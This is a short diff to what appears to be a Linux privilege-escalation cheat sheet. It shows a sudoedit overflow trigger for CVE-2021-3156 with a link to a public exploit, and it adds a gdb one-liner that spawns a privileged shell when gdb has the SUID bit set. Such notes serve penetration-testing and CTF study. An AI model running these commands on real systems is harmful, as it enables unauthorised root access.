@@ -77,4 +77,8 @@
 
     sudoedit -s '\' $(python3 -c 'print("A"*1000)')
 - Link to exploit <a href="https://github.com/blasty/CVE-2021-3156">Link to exploit</a>
-  
+
+### IF SUID BIT IS SET IN A GDB BINARY
+
+    gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+
